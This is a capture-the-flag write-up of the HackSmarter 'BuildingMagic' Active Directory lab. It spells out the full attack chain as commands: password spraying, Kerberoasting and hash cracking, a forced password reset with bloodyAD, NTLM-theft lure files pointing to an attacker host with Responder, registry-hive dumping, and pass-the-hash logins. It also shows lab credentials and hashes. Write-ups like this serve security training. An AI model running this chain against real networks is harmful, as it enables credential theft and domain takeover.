---
title: "BuildingMagic HackSmarter" 
date: 2026-3-25 5:00:00 0000+
tags: [WriteUp, BuildingMagic, HS, Enumeration, Active Directory, NTLM Theft, Responder, ForceChangePassword, Hash Cracking ,smbserver, Kerberoasting, BackupOperators,Phishsing, Lateral Movement, Bloodhound, SMB, bloodyAD, Privilege Escalation, Windows]
categories: [WriteUps, HackSmarter]
image:
  path: /assets/images/BuildingMagic_HS/image.png
---
# BuildingMagic HackSmarter

`BuildingMagic` is an easy `Active Directory` box on `HackSmarter` which is based on assumed breach scenario at start of assessment we have some hashes which on cracking them reveals authentication for a domain user. From `bloodhound` it is analysed that there is user `kerberoastable` which can then change password for another user. This new user has access to a `file share` on the DC which we have write access to and by uploading a malicious document on the DC we `phish` another user which has privileges of `SeBackupOperators` we can then save `registry hives` and dump the domain. The dumped hash can then be identifies as of a user who is domain admin and finally we can retrieve our final flag.

![image.png](/assets/images/BuildingMagic_HS/image.png)

## Initial Enumeration

For this box there is prior information available to us.

![image.png](/assets/images/BuildingMagic_HS/image%201.png)

Saving this credentials to creds.txt file.

### Rustmap

Now starting with rustmap to find the open ports and services running on the box.

```bash
rustmap.py -ip 10.1.123.206
```

![image.png](/assets/images/BuildingMagic_HS/image%202.png)

![image.png](/assets/images/BuildingMagic_HS/image%203.png)

Looking at the results we can say that this is an Active Directory box and the domain name identifies as `buildingmagic.local` and the FQDN be `dc01.buildingmagic.local`

Now since we have some creds prior lets try them with a quick password spray on the domain using `NetExec`.

### Password Spray

Saved usernames to users.txt and hashes to hashes.txt

```bash
nxc smb 10.1.123.206 -u users.txt -p hashes.txt --continue-on-success | grep "[+]"
```

![image.png](/assets/images/BuildingMagic_HS/image%204.png)

None of hashes work.

## Exploitation

### Authentication as R.widdleton

Since none of our hashes worked lets try to crack them using hashcat.

![image.png](/assets/images/BuildingMagic_HS/image%205.png)

One of them cracked.

Doing password spray using this password.

```bash
nxc smb 10.1.123.206 -u users.txt -p 'lilronron' --continue-on-success
```

![image.png](/assets/images/BuildingMagic_HS/image%206.png)

we have auth as `r.widdleton`.

Also enumerating the shares we have this

![image.png](/assets/images/BuildingMagic_HS/image%207.png)

There is a share named `File-Share` which we `r.widdleton` has no access to.

Lets gather some bloodhound data first.

### Bloodhound

Using rusthound to gather the LDAP data.

```bash
rusthound-ce --domain buildingmagic.local -i 10.1.123.206 -u 'r.widdleton' -p 'lilronron' -z
```

![image.png](/assets/images/BuildingMagic_HS/image%208.png)

Analysing results in bloodhound we have user that is `kerberoastable`.

### Kerberoasting

![image.png](/assets/images/BuildingMagic_HS/image%209.png)

This is a `kerberoastable` account, this has an SPN set.

`Kerberoasting` it using Netexec.

```bash
nxc ldap 10.1.123.206 -u 'r.widdleton' -p 'lilronron' --kerberoasting kerberoastable.txt --kdcHost 10.1.123.206
```

![image.png](/assets/images/BuildingMagic_HS/image%2010.png)

Cracking this using hashcat.

```bash
hashcat -m 13100 kerberoastable.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/BuildingMagic_HS/image%2011.png)

From `r.haggard` we have the outbounds.

![image.png](/assets/images/BuildingMagic_HS/image%2012.png)

### R.haggard → H.potch

Lets change the password for H.potch with `r.haggard` using `bloodyAD`.

```bash
bloodyAD -d buildingmagic.local -i 10.1.123.206 -u 'r.haggard' -p 'rubeushagrid' set password 'h.potch' 'aashwin10!'
```

![image.png](/assets/images/BuildingMagic_HS/image%2013.png)

Lets check for that `File-Share` share now to see now we have access to it now as `h.potch`.

```bash
nxc smb 10.1.123.206 -u 'h.potch' -p 'aashwin10!' --shares
```

![image.png](/assets/images/BuildingMagic_HS/image%2014.png)

We have `READ/WRITE` access to that share now.

Lets check out whats in there using `smbclient`.

![image.png](/assets/images/BuildingMagic_HS/image%2015.png)

It was empty! There could be a possibility of NTLM Theft vulnerability here

### NTLM Theft

Since we have write access to the share there could be a ntlm theft or phishing present on the domain lets craft a malicious documents using `ntlm-theft.py`

```bash
python3 /opt/ntlm_theft/ntlm_theft.py -g all -s 10.200.42.95 -f PleaseDontOpen
```

![image.png](/assets/images/BuildingMagic_HS/image%2016.png)

Starting `responder` and putting these files one by one on the `File-Share` share.

![image.png](/assets/images/BuildingMagic_HS/image%2017.png)

After some time we got a hash for the `H.grangon` user.

![image.png](/assets/images/BuildingMagic_HS/image%2018.png)

Cracking this hash using hashcat.

```bash
hashcat -m 5600 h.grangonhash.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/BuildingMagic_HS/image%2019.png)

### Shell as H.grangon

Checking for winrm access as `H.grangon` using Netexec.

```bash
nxc winrm 10.1.123.206 -u 'h.grangon' -p 'magic4ever'
```

![image.png](/assets/images/BuildingMagic_HS/image%2020.png)

```bash
python3 /opt/winrmexec/evil_winrmexec.py -dc-ip 10.1.123.206 hack.smarter/h.grangon:'magic4ever'@dc01.buildingmagic.local
```

![image.png](/assets/images/BuildingMagic_HS/image%2021.png)

Now claiming the `user.txt` from user’s desktop

![image.png](/assets/images/BuildingMagic_HS/image%2022.png)

## Privilege Escalation

### Shell as A.Flatch

Looking at the privileges as `H.grangon` we have the `SeBackupPrivilege`.

![image.png](/assets/images/BuildingMagic_HS/image%2023.png)

Using `NetExec` to dump the hashes.

```bash
nxc smb 10.1.123.206 -u 'h.grangon' -p 'magic4ever' -M backup_operator
```

![image.png](/assets/images/BuildingMagic_HS/image%2024.png)

This user is not present in the backup_operators group and have the privileges of `SeBackupPrivilege`. Maybe that is the issue with nxc.

Lets do that using powershell.

![image.png](/assets/images/BuildingMagic_HS/image%2025.png)

Downloading `SAM` and `SYSTEM` using `SMBSERVER`

![image.png](/assets/images/BuildingMagic_HS/image%2026.png)

![image.png](/assets/images/BuildingMagic_HS/image%2027.png)

Now dumping the hashes using `secretsdump.py`

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

![image.png](/assets/images/BuildingMagic_HS/image%2028.png)

Lets validate using `Netexec`.

```bash
nxc ldap 10.1.123.206 -u 'Administrator' -H '520126a03f5d5a8d836f1c4f34ede7ce'
```

![image.png](/assets/images/BuildingMagic_HS/image%2029.png)

We dont have authentication as `administrator`, but we have another user in `administrator’s` group.

![image.png](/assets/images/BuildingMagic_HS/image%2030.png)

Checking authentication with `A.Flatch` that.

![image.png](/assets/images/BuildingMagic_HS/image%2031.png)

It says pwned! Meaning we have a high integrity shell.

Logging in using `evil-winrm`

```bash
evil-winrm -i 10.1.123.206 -u 'A.flatch' -H '520126a03f5d5a8d836f1c4f34ede7ce'
```

![image.png](/assets/images/BuildingMagic_HS/image%2032.png)